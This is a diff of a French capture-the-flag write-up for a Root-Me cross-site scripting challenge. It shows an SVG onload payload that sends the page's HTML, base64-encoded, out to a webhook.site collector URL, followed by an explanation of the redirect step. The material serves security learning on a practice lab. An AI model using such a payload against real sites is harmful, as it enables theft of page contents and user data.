@@ -65,13 +65,14 @@ Okay nous avons une page pour signaler une page qui est vulnérable à une faill
 
 Première tentative de payload : 
 ```html
-http://challenge01.root-me.org:58008/page?user=<svg onload="document.location.href='https://webhook.site/baad9b72-09e4-47bc-b3e9-29368cce0caa?c='.concat(encodeURIComponent(document.body.innerHTML))">
+http://challenge01.root-me.org:58008/page?user=<svg onload="document.location.href='https://webhook.site/baad9b72-09e4-47bc-b3e9-29368cce0caa?c='.concat(encodeURIComponent(btoa(document.body.innerHTML)))">
 ```
 Bon au niveau du svg nous gardons la même logique. Maintenant laisser moi vous expliquez la suite du payload. 
 
 	```html
 	document.location.href= 
 	```
+	
 va nous permettre dans notre cas de dire "lorsque tu as analyser et afficher avec succès l'image tu vas quitter la page et aller naviger vers le nouveau URL : ".
 Dans notre cas document.location.href va pointer sur l'url de webhook url qui va nous permettre de récupérer les données de la query que nous allons initialisé.
 
